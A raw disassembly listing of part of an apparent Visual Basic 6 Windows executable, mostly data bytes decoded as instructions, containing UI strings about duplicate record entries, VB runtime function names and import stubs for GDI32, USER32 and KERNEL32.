  4039ab:	00 6e 00             	add    %ch,0x0(%esi)
  4039ae:	65 00 20             	add    %ah,%gs:(%eax)
  4039b1:	00 62 00             	add    %ah,0x0(%edx)
  4039b4:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4039b8:	61                   	popa
  4039b9:	00 75 00             	add    %dh,0x0(%ebp)
  4039bc:	73 00                	jae    0x4039be
  4039be:	65 00 20             	add    %ah,%gs:(%eax)
  4039c1:	00 27                	add    %ah,(%edi)
  4039c3:	00 00                	add    %al,(%eax)
  4039c5:	00 00                	add    %al,(%eax)
  4039c7:	00 18                	add    %bl,(%eax)
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	00 27                	add    %ah,(%edi)
  4039cd:	00 20                	add    %ah,(%eax)
  4039cf:	00 69 00             	add    %ch,0x0(%ecx)
  4039d2:	73 00                	jae    0x4039d4
  4039d4:	20 00                	and    %al,(%eax)
  4039d6:	61                   	popa
  4039d7:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  4039db:	00 65 00             	add    %ah,0x0(%ebp)
  4039de:	61                   	popa
  4039df:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  4039e3:	00 00                	add    %al,(%eax)
  4039e5:	00 00                	add    %al,(%eax)
  4039e7:	00 5e 00             	add    %bl,0x0(%esi)
  4039ea:	00 00                	add    %al,(%eax)
  4039ec:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  4039f0:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
  4039f6:	20 00                	and    %al,(%eax)
  4039f8:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  4039fe:	74 00                	je     0x403a00
  403a00:	68 00 65 00 20       	push   $0x20006500
  403a05:	00 72 00             	add    %dh,0x0(%edx)
  403a08:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  403a0c:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0d:	00 72 00             	add    %dh,0x0(%edx)
  403a10:	64 00 2e             	add    %ch,%fs:(%esi)
  403a13:	00 50 00             	add    %dl,0x0(%eax)
  403a16:	6c                   	insb   (%dx),%es:(%edi)
  403a17:	00 65 00             	add    %ah,0x0(%ebp)
  403a1a:	61                   	popa
  403a1b:	00 73 00             	add    %dh,0x0(%ebx)
  403a1e:	65 00 20             	add    %ah,%gs:(%eax)
  403a21:	00 63 00             	add    %ah,0x0(%ebx)
  403a24:	68 00 65 00 63       	push   $0x63006500
  403a29:	00 6b 00             	add    %ch,0x0(%ebx)
  403a2c:	20 00                	and    %al,(%eax)
  403a2e:	61                   	popa
  403a2f:	00 6e 00             	add    %ch,0x0(%esi)
  403a32:	64 00 20             	add    %ah,%fs:(%eax)
  403a35:	00 63 00             	add    %ah,0x0(%ebx)
  403a38:	68 00 61 00 6e       	push   $0x6e006100
  403a3d:	00 67 00             	add    %ah,0x0(%edi)
  403a40:	65 00 20             	add    %ah,%gs:(%eax)
  403a43:	00 69 00             	add    %ch,0x0(%ecx)
  403a46:	74 00                	je     0x403a48
  403a48:	2e 00 00             	add    %al,%cs:(%eax)
  403a4b:	00 72 00             	add    %dh,0x0(%edx)
  403a4e:	00 00                	add    %al,(%eax)
  403a50:	4e                   	dec    %esi
  403a51:	00 6f 00             	add    %ch,0x0(%edi)
  403a54:	74 00                	je     0x403a56
  403a56:	65 00 3a             	add    %bh,%gs:(%edx)
  403a59:	00 20                	add    %ah,(%eax)
  403a5b:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  403a5f:	00 70 00             	add    %dh,0x0(%eax)
  403a62:	6c                   	insb   (%dx),%es:(%edi)
  403a63:	00 69 00             	add    %ch,0x0(%ecx)
  403a66:	63 00                	arpl   %eax,(%eax)
  403a68:	61                   	popa
  403a69:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  403a6d:	00 6f 00             	add    %ch,0x0(%edi)
  403a70:	6e                   	outsb  %ds:(%esi),(%dx)
  403a71:	00 20                	add    %ah,(%eax)
  403a73:	00 6f 00             	add    %ch,0x0(%edi)
  403a76:	66 00 20             	data16 add %ah,(%eax)
  403a79:	00 65 00             	add    %ah,0x0(%ebp)
  403a7c:	6e                   	outsb  %ds:(%esi),(%dx)
  403a7d:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  403a81:	00 69 00             	add    %ch,0x0(%ecx)
  403a84:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  403a88:	20 00                	and    %al,(%eax)
  403a8a:	69 00 73 00 20 00    	imul   $0x200073,(%eax),%eax
  403a90:	6e                   	outsb  %ds:(%esi),(%dx)
  403a91:	00 6f 00             	add    %ch,0x0(%edi)
  403a94:	74 00                	je     0x403a96
  403a96:	20 00                	and    %al,(%eax)
  403a98:	61                   	popa
  403a99:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  403a9d:	00 6f 00             	add    %ch,0x0(%edi)
  403aa0:	77 00                	ja     0x403aa2
  403aa2:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  403aa7:	00 69 00             	add    %ch,0x0(%ecx)
  403aaa:	6e                   	outsb  %ds:(%esi),(%dx)
  403aab:	00 20                	add    %ah,(%eax)
  403aad:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  403ab1:	00 69 00             	add    %ch,0x0(%ecx)
  403ab4:	73 00                	jae    0x403ab6
  403ab6:	20 00                	and    %al,(%eax)
  403ab8:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  403abc:	72 00                	jb     0x403abe
  403abe:	6d                   	insl   (%dx),%es:(%edi)
  403abf:	00 2e                	add    %ch,(%esi)
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 5f 5f             	add    %bl,0x5f(%edi)
  403ac6:	76 62                	jbe    0x403b2a
  403ac8:	61                   	popa
  403ac9:	56                   	push   %esi
  403aca:	61                   	popa
  403acb:	72 54                	jb     0x403b21
  403acd:	73 74                	jae    0x403b43
  403acf:	47                   	inc    %edi
  403ad0:	74 00                	je     0x403ad2
  403ad2:	00 00                	add    %al,(%eax)
  403ad4:	5f                   	pop    %edi
  403ad5:	5f                   	pop    %edi
  403ad6:	76 62                	jbe    0x403b3a
  403ad8:	61                   	popa
  403ad9:	45                   	inc    %ebp
  403ada:	78 69                	js     0x403b45
  403adc:	74 50                	je     0x403b2e
  403ade:	72 6f                	jb     0x403b4f
  403ae0:	63 00                	arpl   %eax,(%eax)
  403ae2:	00 00                	add    %al,(%eax)
  403ae4:	5f                   	pop    %edi
  403ae5:	5f                   	pop    %edi
  403ae6:	76 62                	jbe    0x403b4a
  403ae8:	61                   	popa
  403ae9:	52                   	push   %edx
  403aea:	65 73 75             	gs jae 0x403b62
  403aed:	6d                   	insl   (%dx),%es:(%edi)
  403aee:	65 00 5f 5f          	add    %bl,%gs:0x5f(%edi)
  403af2:	76 62                	jbe    0x403b56
  403af4:	61                   	popa
  403af5:	4f                   	dec    %edi
  403af6:	62 6a 53             	bound  %ebp,0x53(%edx)
  403af9:	65 74 00             	gs je  0x403afc
  403afc:	5f                   	pop    %edi
  403afd:	5f                   	pop    %edi
  403afe:	76 62                	jbe    0x403b62
  403b00:	61                   	popa
  403b01:	56                   	push   %esi
  403b02:	61                   	popa
  403b03:	72 41                	jb     0x403b46
  403b05:	64 64 00 5f 5f       	fs add %bl,%fs:0x5f(%edi)
  403b0a:	76 62                	jbe    0x403b6e
  403b0c:	61                   	popa
  403b0d:	49                   	dec    %ecx
  403b0e:	34 56                	xor    $0x56,%al
  403b10:	61                   	popa
  403b11:	72 00                	jb     0x403b13
  403b13:	00 5f 5f             	add    %bl,0x5f(%edi)
  403b16:	76 62                	jbe    0x403b7a
  403b18:	61                   	popa
  403b19:	56                   	push   %esi
  403b1a:	61                   	popa
  403b1b:	72 54                	jb     0x403b71
  403b1d:	73 74                	jae    0x403b93
  403b1f:	45                   	inc    %ebp
  403b20:	71 00                	jno    0x403b22
  403b22:	00 00                	add    %al,(%eax)
  403b24:	5f                   	pop    %edi
  403b25:	5f                   	pop    %edi
  403b26:	76 62                	jbe    0x403b8a
  403b28:	61                   	popa
  403b29:	53                   	push   %ebx
  403b2a:	74 72                	je     0x403b9e
  403b2c:	49                   	dec    %ecx
  403b2d:	34 00                	xor    $0x0,%al
  403b2f:	00 0a                	add    %cl,(%edx)
  403b31:	00 00                	add    %al,(%eax)
  403b33:	00 74 00 43          	add    %dh,0x43(%eax,%eax,1)
  403b37:	00 62 00             	add    %ah,0x0(%edx)
  403b3a:	56                   	push   %esi
  403b3b:	00 79 00             	add    %bh,0x0(%ecx)
  403b3e:	00 00                	add    %al,(%eax)
  403b40:	5f                   	pop    %edi
  403b41:	5f                   	pop    %edi
  403b42:	76 62                	jbe    0x403ba6
  403b44:	61                   	popa
  403b45:	4c                   	dec    %esp
  403b46:	65 6e                	outsb  %gs:(%esi),(%dx)
  403b48:	42                   	inc    %edx
  403b49:	73 74                	jae    0x403bbf
  403b4b:	72 00                	jb     0x403b4d
  403b4d:	00 00                	add    %al,(%eax)
  403b4f:	00 5f 5f             	add    %bl,0x5f(%edi)
  403b52:	76 62                	jbe    0x403bb6
  403b54:	61                   	popa
  403b55:	55                   	push   %ebp
  403b56:	6e                   	outsb  %ds:(%esi),(%dx)
  403b57:	6b 56 61 72          	imul   $0x72,0x61(%esi),%edx
  403b5b:	00 5f 5f             	add    %bl,0x5f(%edi)
  403b5e:	76 62                	jbe    0x403bc2
  403b60:	61                   	popa
  403b61:	4f                   	dec    %edi
  403b62:	62 6a 49             	bound  %ebp,0x49(%edx)
  403b65:	73 00                	jae    0x403b67
  403b67:	00 5f 5f             	add    %bl,0x5f(%edi)
  403b6a:	76 62                	jbe    0x403bce
  403b6c:	61                   	popa
  403b6d:	45                   	inc    %ebp
  403b6e:	72 72                	jb     0x403be2
  403b70:	6f                   	outsl  %ds:(%esi),(%dx)
  403b71:	72 4f                	jb     0x403bc2
  403b73:	76 65                	jbe    0x403bda
  403b75:	72 66                	jb     0x403bdd
  403b77:	6c                   	insb   (%dx),%es:(%edi)
  403b78:	6f                   	outsl  %ds:(%esi),(%dx)
  403b79:	77 00                	ja     0x403b7b
  403b7b:	00 5f 5f             	add    %bl,0x5f(%edi)
  403b7e:	76 62                	jbe    0x403be2
  403b80:	61                   	popa
  403b81:	56                   	push   %esi
  403b82:	61                   	popa
  403b83:	72 53                	jb     0x403bd8
  403b85:	65 74 4f             	gs je  0x403bd7
  403b88:	62 6a 41             	bound  %ebp,0x41(%edx)
  403b8b:	64 64 72 65          	fs fs jb 0x403bf4
  403b8f:	66 00 00             	data16 add %al,(%eax)
  403b92:	00 00                	add    %al,(%eax)
  403b94:	5f                   	pop    %edi
  403b95:	5f                   	pop    %edi
  403b96:	76 62                	jbe    0x403bfa
  403b98:	61                   	popa
  403b99:	56                   	push   %esi
  403b9a:	61                   	popa
  403b9b:	72 56                	jb     0x403bf3
  403b9d:	61                   	popa
  403b9e:	72 67                	jb     0x403c07
  403ba0:	4e                   	dec    %esi
  403ba1:	6f                   	outsl  %ds:(%esi),(%dx)
  403ba2:	66 72 65             	data16 jb 0x403c0a
  403ba5:	65 00 00             	add    %al,%gs:(%eax)
  403ba8:	5f                   	pop    %edi
  403ba9:	5f                   	pop    %edi
  403baa:	76 62                	jbe    0x403c0e
  403bac:	61                   	popa
  403bad:	56                   	push   %esi
  403bae:	61                   	popa
  403baf:	72 4c                	jb     0x403bfd
  403bb1:	61                   	popa
  403bb2:	74 65                	je     0x403c19
  403bb4:	4d                   	dec    %ebp
  403bb5:	65 6d                	gs insl (%dx),%es:(%edi)
  403bb7:	43                   	inc    %ebx
  403bb8:	61                   	popa
  403bb9:	6c                   	insb   (%dx),%es:(%edi)
  403bba:	6c                   	insb   (%dx),%es:(%edi)
  403bbb:	53                   	push   %ebx
  403bbc:	74 00                	je     0x403bbe
  403bbe:	00 00                	add    %al,(%eax)
  403bc0:	5f                   	pop    %edi
  403bc1:	5f                   	pop    %edi
  403bc2:	76 62                	jbe    0x403c26
  403bc4:	61                   	popa
  403bc5:	53                   	push   %ebx
  403bc6:	74 72                	je     0x403c3a
  403bc8:	55                   	push   %ebp
  403bc9:	49                   	dec    %ecx
  403bca:	31 00                	xor    %eax,(%eax)
  403bcc:	5f                   	pop    %edi
  403bcd:	5f                   	pop    %edi
  403bce:	76 62                	jbe    0x403c32
  403bd0:	61                   	popa
  403bd1:	56                   	push   %esi
  403bd2:	61                   	popa
  403bd3:	72 43                	jb     0x403c18
  403bd5:	6d                   	insl   (%dx),%es:(%edi)
  403bd6:	70 45                	jo     0x403c1d
  403bd8:	71 00                	jno    0x403bda
  403bda:	00 00                	add    %al,(%eax)
  403bdc:	5f                   	pop    %edi
  403bdd:	5f                   	pop    %edi
  403bde:	76 62                	jbe    0x403c42
  403be0:	61                   	popa
  403be1:	55                   	push   %ebp
  403be2:	49                   	dec    %ecx
  403be3:	31 49 32             	xor    %ecx,0x32(%ecx)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	5f                   	pop    %edi
  403be9:	5f                   	pop    %edi
  403bea:	76 62                	jbe    0x403c4e
  403bec:	61                   	popa
  403bed:	56                   	push   %esi
  403bee:	61                   	popa
  403bef:	72 53                	jb     0x403c44
  403bf1:	65 74 56             	gs je  0x403c4a
  403bf4:	61                   	popa
  403bf5:	72 00                	jb     0x403bf7
  403bf7:	00 5f 5f             	add    %bl,0x5f(%edi)
  403bfa:	76 62                	jbe    0x403c5e
  403bfc:	61                   	popa
  403bfd:	56                   	push   %esi
  403bfe:	61                   	popa
  403bff:	72 4e                	jb     0x403c4f
  403c01:	6f                   	outsl  %ds:(%esi),(%dx)
  403c02:	74 00                	je     0x403c04
  403c04:	5f                   	pop    %edi
  403c05:	5f                   	pop    %edi
  403c06:	76 62                	jbe    0x403c6a
  403c08:	61                   	popa
  403c09:	56                   	push   %esi
  403c0a:	61                   	popa
  403c0b:	72 4c                	jb     0x403c59
  403c0d:	61                   	popa
  403c0e:	74 65                	je     0x403c75
  403c10:	4d                   	dec    %ebp
  403c11:	65 6d                	gs insl (%dx),%es:(%edi)
  403c13:	53                   	push   %ebx
  403c14:	74 00                	je     0x403c16
  403c16:	00 00                	add    %al,(%eax)
  403c18:	5f                   	pop    %edi
  403c19:	5f                   	pop    %edi
  403c1a:	76 62                	jbe    0x403c7e
  403c1c:	61                   	popa
  403c1d:	42                   	inc    %edx
  403c1e:	6f                   	outsl  %ds:(%esi),(%dx)
  403c1f:	6f                   	outsl  %ds:(%esi),(%dx)
  403c20:	6c                   	insb   (%dx),%es:(%edi)
  403c21:	56                   	push   %esi
  403c22:	61                   	popa
  403c23:	72 4e                	jb     0x403c73
  403c25:	75 6c                	jne    0x403c93
  403c27:	6c                   	insb   (%dx),%es:(%edi)
  403c28:	00 00                	add    %al,(%eax)
  403c2a:	00 00                	add    %al,(%eax)
  403c2c:	5f                   	pop    %edi
  403c2d:	5f                   	pop    %edi
  403c2e:	76 62                	jbe    0x403c92
  403c30:	61                   	popa
  403c31:	56                   	push   %esi
  403c32:	61                   	popa
  403c33:	72 4c                	jb     0x403c81
  403c35:	61                   	popa
  403c36:	74 65                	je     0x403c9d
  403c38:	4d                   	dec    %ebp
  403c39:	65 6d                	gs insl (%dx),%es:(%edi)
  403c3b:	43                   	inc    %ebx
  403c3c:	61                   	popa
  403c3d:	6c                   	insb   (%dx),%es:(%edi)
  403c3e:	6c                   	insb   (%dx),%es:(%edi)
  403c3f:	4c                   	dec    %esp
  403c40:	64 52                	fs push %edx
  403c42:	66 00 5f 5f          	data16 add %bl,0x5f(%edi)
  403c46:	76 62                	jbe    0x403caa
  403c48:	61                   	popa
  403c49:	4f                   	dec    %edi
  403c4a:	62 6a 56             	bound  %ebp,0x56(%edx)
  403c4d:	61                   	popa
  403c4e:	72 00                	jb     0x403c50
  403c50:	5f                   	pop    %edi
  403c51:	5f                   	pop    %edi
  403c52:	76 62                	jbe    0x403cb6
  403c54:	61                   	popa
  403c55:	4c                   	dec    %esp
  403c56:	61                   	popa
  403c57:	74 65                	je     0x403cbe
  403c59:	4d                   	dec    %ebp
  403c5a:	65 6d                	gs insl (%dx),%es:(%edi)
  403c5c:	43                   	inc    %ebx
  403c5d:	61                   	popa
  403c5e:	6c                   	insb   (%dx),%es:(%edi)
  403c5f:	6c                   	insb   (%dx),%es:(%edi)
  403c60:	00 00                	add    %al,(%eax)
  403c62:	00 00                	add    %al,(%eax)
  403c64:	5f                   	pop    %edi
  403c65:	5f                   	pop    %edi
  403c66:	76 62                	jbe    0x403cca
  403c68:	61                   	popa
  403c69:	56                   	push   %esi
  403c6a:	61                   	popa
  403c6b:	72 44                	jb     0x403cb1
  403c6d:	75 70                	jne    0x403cdf
  403c6f:	00 5f 5f             	add    %bl,0x5f(%edi)
  403c72:	76 62                	jbe    0x403cd6
  403c74:	61                   	popa
  403c75:	46                   	inc    %esi
  403c76:	72 65                	jb     0x403cdd
  403c78:	65 56                	gs push %esi
  403c7a:	61                   	popa
  403c7b:	72 4c                	jb     0x403cc9
  403c7d:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  403c84:	5f                   	pop    %edi
  403c85:	5f                   	pop    %edi
  403c86:	76 62                	jbe    0x403cea
  403c88:	61                   	popa
  403c89:	56                   	push   %esi
  403c8a:	61                   	popa
  403c8b:	72 4c                	jb     0x403cd9
  403c8d:	61                   	popa
  403c8e:	74 65                	je     0x403cf5
  403c90:	4d                   	dec    %ebp
  403c91:	65 6d                	gs insl (%dx),%es:(%edi)
  403c93:	43                   	inc    %ebx
  403c94:	61                   	popa
  403c95:	6c                   	insb   (%dx),%es:(%edi)
  403c96:	6c                   	insb   (%dx),%es:(%edi)
  403c97:	4c                   	dec    %esp
  403c98:	64 00 00             	add    %al,%fs:(%eax)
  403c9b:	00 5f 5f             	add    %bl,0x5f(%edi)
  403c9e:	76 62                	jbe    0x403d02
  403ca0:	61                   	popa
  403ca1:	56                   	push   %esi
  403ca2:	61                   	popa
  403ca3:	72 43                	jb     0x403ce8
  403ca5:	61                   	popa
  403ca6:	74 00                	je     0x403ca8
  403ca8:	5f                   	pop    %edi
  403ca9:	5f                   	pop    %edi
  403caa:	76 62                	jbe    0x403d0e
  403cac:	61                   	popa
  403cad:	50                   	push   %eax
  403cae:	72 69                	jb     0x403d19
  403cb0:	6e                   	outsb  %ds:(%esi),(%dx)
  403cb1:	74 46                	je     0x403cf9
  403cb3:	69 6c 65 00 00 5f 5f 	imul   $0x765f5f00,0x0(%ebp,%eiz,2),%ebp
  403cba:	76 
  403cbb:	62 61 53             	bound  %esp,0x53(%ecx)
  403cbe:	74 72                	je     0x403d32
  403cc0:	43                   	inc    %ebx
  403cc1:	6f                   	outsl  %ds:(%esi),(%dx)
  403cc2:	70 79                	jo     0x403d3d
  403cc4:	00 00                	add    %al,(%eax)
  403cc6:	00 00                	add    %al,(%eax)
  403cc8:	5f                   	pop    %edi
  403cc9:	5f                   	pop    %edi
  403cca:	76 62                	jbe    0x403d2e
  403ccc:	61                   	popa
  403ccd:	56                   	push   %esi
  403cce:	61                   	popa
  403ccf:	72 43                	jb     0x403d14
  403cd1:	6f                   	outsl  %ds:(%esi),(%dx)
  403cd2:	70 79                	jo     0x403d4d
  403cd4:	00 00                	add    %al,(%eax)
  403cd6:	00 00                	add    %al,(%eax)
  403cd8:	06                   	push   %es
  403cd9:	00 00                	add    %al,(%eax)
  403cdb:	00 70 00             	add    %dh,0x0(%eax)
  403cde:	42                   	inc    %edx
  403cdf:	00 65 00             	add    %ah,0x0(%ebp)
  403ce2:	00 00                	add    %al,(%eax)
  403ce4:	12 00                	adc    (%eax),%al
  403ce6:	00 00                	add    %al,(%eax)
  403ce8:	64 00 64 00 62       	add    %ah,%fs:0x62(%eax,%eax,1)
  403ced:	00 67 00             	add    %ah,0x0(%edi)
  403cf0:	44                   	inc    %esp
  403cf1:	00 4b 00             	add    %cl,0x0(%ebx)
  403cf4:	52                   	push   %edx
  403cf5:	00 77 00             	add    %dh,0x0(%edi)
  403cf8:	49                   	dec    %ecx
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 00                	add    %al,(%eax)
  403cfd:	00 00                	add    %al,(%eax)
  403cff:	00 5f 5f             	add    %bl,0x5f(%edi)
  403d02:	76 62                	jbe    0x403d66
  403d04:	61                   	popa
  403d05:	46                   	inc    %esi
  403d06:	72 65                	jb     0x403d6d
  403d08:	65 53                	gs push %ebx
  403d0a:	74 72                	je     0x403d7e
  403d0c:	00 00                	add    %al,(%eax)
  403d0e:	00 00                	add    %al,(%eax)
  403d10:	5f                   	pop    %edi
  403d11:	5f                   	pop    %edi
  403d12:	76 62                	jbe    0x403d76
  403d14:	61                   	popa
  403d15:	53                   	push   %ebx
  403d16:	74 72                	je     0x403d8a
  403d18:	56                   	push   %esi
  403d19:	61                   	popa
  403d1a:	72 56                	jb     0x403d72
  403d1c:	61                   	popa
  403d1d:	6c                   	insb   (%dx),%es:(%edi)
  403d1e:	00 00                	add    %al,(%eax)
  403d20:	5f                   	pop    %edi
  403d21:	5f                   	pop    %edi
  403d22:	76 62                	jbe    0x403d86
  403d24:	61                   	popa
  403d25:	46                   	inc    %esi
  403d26:	72 65                	jb     0x403d8d
  403d28:	65 56                	gs push %esi
  403d2a:	61                   	popa
  403d2b:	72 00                	jb     0x403d2d
  403d2d:	00 00                	add    %al,(%eax)
  403d2f:	00 5f 5f             	add    %bl,0x5f(%edi)
  403d32:	76 62                	jbe    0x403d96
  403d34:	61                   	popa
  403d35:	53                   	push   %ebx
  403d36:	74 72                	je     0x403daa
  403d38:	56                   	push   %esi
  403d39:	61                   	popa
  403d3a:	72 4d                	jb     0x403d89
  403d3c:	6f                   	outsl  %ds:(%esi),(%dx)
  403d3d:	76 65                	jbe    0x403da4
  403d3f:	00 5f 5f             	add    %bl,0x5f(%edi)
  403d42:	76 62                	jbe    0x403da6
  403d44:	61                   	popa
  403d45:	56                   	push   %esi
  403d46:	61                   	popa
  403d47:	72 4d                	jb     0x403d96
  403d49:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4a:	76 65                	jbe    0x403db1
  403d4c:	00 00                	add    %al,(%eax)
  403d4e:	00 00                	add    %al,(%eax)
  403d50:	5f                   	pop    %edi
  403d51:	5f                   	pop    %edi
  403d52:	76 62                	jbe    0x403db6
  403d54:	61                   	popa
  403d55:	4f                   	dec    %edi
  403d56:	6e                   	outsb  %ds:(%esi),(%dx)
  403d57:	45                   	inc    %ebp
  403d58:	72 72                	jb     0x403dcc
  403d5a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d5b:	72 00                	jb     0x403d5d
  403d5d:	00 00                	add    %al,(%eax)
  403d5f:	00 5f 5f             	add    %bl,0x5f(%edi)
  403d62:	76 62                	jbe    0x403dc6
  403d64:	61                   	popa
  403d65:	46                   	inc    %esi
  403d66:	69 6c 65 43 6c 6f 73 	imul   $0x65736f6c,0x43(%ebp,%eiz,2),%ebp
  403d6d:	65 
  403d6e:	00 00                	add    %al,(%eax)
  403d70:	5f                   	pop    %edi
  403d71:	5f                   	pop    %edi
  403d72:	76 62                	jbe    0x403dd6
  403d74:	61                   	popa
  403d75:	49                   	dec    %ecx
  403d76:	6e                   	outsb  %ds:(%esi),(%dx)
  403d77:	70 75                	jo     0x403dee
  403d79:	74 46                	je     0x403dc1
  403d7b:	69 6c 65 00 00 5f 5f 	imul   $0x765f5f00,0x0(%ebp,%eiz,2),%ebp
  403d82:	76 
  403d83:	62 61 46             	bound  %esp,0x46(%ecx)
  403d86:	72 65                	jb     0x403ded
  403d88:	65 53                	gs push %ebx
  403d8a:	74 72                	je     0x403dfe
  403d8c:	4c                   	dec    %esp
  403d8d:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  403d94:	5f                   	pop    %edi
  403d95:	5f                   	pop    %edi
  403d96:	76 62                	jbe    0x403dfa
  403d98:	61                   	popa
  403d99:	53                   	push   %ebx
  403d9a:	74 72                	je     0x403e0e
  403d9c:	43                   	inc    %ebx
  403d9d:	61                   	popa
  403d9e:	74 00                	je     0x403da0
  403da0:	5f                   	pop    %edi
  403da1:	5f                   	pop    %edi
  403da2:	76 62                	jbe    0x403e06
  403da4:	61                   	popa
  403da5:	53                   	push   %ebx
  403da6:	74 72                	je     0x403e1a
  403da8:	4d                   	dec    %ebp
  403da9:	6f                   	outsl  %ds:(%esi),(%dx)
  403daa:	76 65                	jbe    0x403e11
  403dac:	00 00                	add    %al,(%eax)
  403dae:	00 00                	add    %al,(%eax)
  403db0:	5f                   	pop    %edi
  403db1:	5f                   	pop    %edi
  403db2:	76 62                	jbe    0x403e16
  403db4:	61                   	popa
  403db5:	46                   	inc    %esi
  403db6:	69 6c 65 4f 70 65 6e 	imul   $0x6e6570,0x4f(%ebp,%eiz,2),%ebp
  403dbd:	00 
  403dbe:	00 00                	add    %al,(%eax)
  403dc0:	06                   	push   %es
  403dc1:	00 00                	add    %al,(%eax)
  403dc3:	00 67 64             	add    %ah,0x64(%edi)
  403dc6:	69 33 32 00 00 00    	imul   $0x32,(%ebx),%esi
  403dcc:	0e                   	push   %cs
  403dcd:	00 00                	add    %al,(%eax)
  403dcf:	00 47 65             	add    %al,0x65(%edi)
  403dd2:	74 44                	je     0x403e18
  403dd4:	65 76 69             	gs jbe 0x403e40
  403dd7:	63 65 43             	arpl   %esp,0x43(%ebp)
  403dda:	61                   	popa
  403ddb:	70 73                	jo     0x403e50
  403ddd:	00 00                	add    %al,(%eax)
  403ddf:	00 c4                	add    %al,%ah
  403de1:	3d 40 00 d0 3d       	cmp    $0x3dd00040,%eax
  403de6:	40                   	inc    %eax
  403de7:	00 00                	add    %al,(%eax)
  403de9:	00 04 00             	add    %al,(%eax,%eax,1)
  403dec:	30 75 40             	xor    %dh,0x40(%ebp)
	...
  403df7:	00 a1 38 75 40 00    	add    %ah,0x407538(%ecx)
  403dfd:	0b c0                	or     %eax,%eax
  403dff:	74 02                	je     0x403e03
  403e01:	ff e0                	jmp    *%eax
  403e03:	68 e0 3d 40 00       	push   $0x403de0
  403e08:	b8 2e 14 40 00       	mov    $0x40142e,%eax
  403e0d:	ff d0                	call   *%eax
  403e0f:	ff e0                	jmp    *%eax
  403e11:	00 00                	add    %al,(%eax)
  403e13:	00 07                	add    %al,(%edi)
  403e15:	00 00                	add    %al,(%eax)
  403e17:	00 55 53             	add    %dl,0x53(%ebp)
  403e1a:	45                   	inc    %ebp
  403e1b:	52                   	push   %edx
  403e1c:	33 32                	xor    (%edx),%esi
  403e1e:	00 00                	add    %al,(%eax)
  403e20:	10 00                	adc    %al,(%eax)
  403e22:	00 00                	add    %al,(%eax)
  403e24:	43                   	inc    %ebx
  403e25:	61                   	popa
  403e26:	6c                   	insb   (%dx),%es:(%edi)
  403e27:	6c                   	insb   (%dx),%es:(%edi)
  403e28:	57                   	push   %edi
  403e29:	69 6e 64 6f 77 50 72 	imul   $0x7250776f,0x64(%esi),%ebp
  403e30:	6f                   	outsl  %ds:(%esi),(%dx)
  403e31:	63 41 00             	arpl   %eax,0x0(%ecx)
  403e34:	18 3e                	sbb    %bh,(%esi)
  403e36:	40                   	inc    %eax
  403e37:	00 24 3e             	add    %ah,(%esi,%edi,1)
  403e3a:	40                   	inc    %eax
  403e3b:	00 00                	add    %al,(%eax)
  403e3d:	00 04 00             	add    %al,(%eax,%eax,1)
  403e40:	3c 75                	cmp    $0x75,%al
  403e42:	40                   	inc    %eax
	...
  403e4b:	00 a1 44 75 40 00    	add    %ah,0x407544(%ecx)
  403e51:	0b c0                	or     %eax,%eax
  403e53:	74 02                	je     0x403e57
  403e55:	ff e0                	jmp    *%eax
  403e57:	68 34 3e 40 00       	push   $0x403e34
  403e5c:	b8 2e 14 40 00       	mov    $0x40142e,%eax
  403e61:	ff d0                	call   *%eax
  403e63:	ff e0                	jmp    *%eax
  403e65:	00 00                	add    %al,(%eax)
  403e67:	00 09                	add    %cl,(%ecx)
  403e69:	00 00                	add    %al,(%eax)
  403e6b:	00 4b 45             	add    %cl,0x45(%ebx)
  403e6e:	52                   	push   %edx
  403e6f:	4e                   	dec    %esi
  403e70:	45                   	inc    %ebp
  403e71:	4c                   	dec    %esp
  403e72:	33 32                	xor    (%edx),%esi
  403e74:	00 00                	add    %al,(%eax)
  403e76:	00 00                	add    %al,(%eax)
  403e78:	07                   	pop    %es
  403e79:	00 00                	add    %al,(%eax)
  403e7b:	00 4d 75             	add    %cl,0x75(%ebp)
  403e7e:	6c                   	insb   (%dx),%es:(%edi)
  403e7f:	44                   	inc    %esp
  403e80:	69 76 00 00 6c 3e 40 	imul   $0x403e6c00,0x0(%esi),%esi
  403e87:	00 7c 3e 40          	add    %bh,0x40(%esi,%edi,1)
  403e8b:	00 00                	add    %al,(%eax)
  403e8d:	00 04 00             	add    %al,(%eax,%eax,1)
  403e90:	48                   	dec    %eax
  403e91:	75 40                	jne    0x403ed3
	...
  403e9b:	00 a1 50 75 40 00    	add    %ah,0x407550(%ecx)
  403ea1:	0b c0                	or     %eax,%eax
  403ea3:	74 02                	je     0x403ea7
  403ea5:	ff e0                	jmp    *%eax
  403ea7:	68 84 3e 40 00       	push   $0x403e84
  403eac:	b8 2e 14 40 00       	mov    $0x40142e,%eax
  403eb1:	ff d0                	call   *%eax
  403eb3:	ff e0                	jmp    *%eax
  403eb5:	00 00                	add    %al,(%eax)
  403eb7:	00 18                	add    %bl,(%eax)
  403eb9:	00 00                	add    %al,(%eax)
  403ebb:	00 01                	add    %al,(%ecx)
  403ebd:	00 92 00 01 00 00    	add    %dl,0x100(%edx)
	...
  403ecb:	00 11                	add    %dl,(%ecx)
  403ecd:	00 00                	add    %al,(%eax)
  403ecf:	00 00                	add    %al,(%eax)
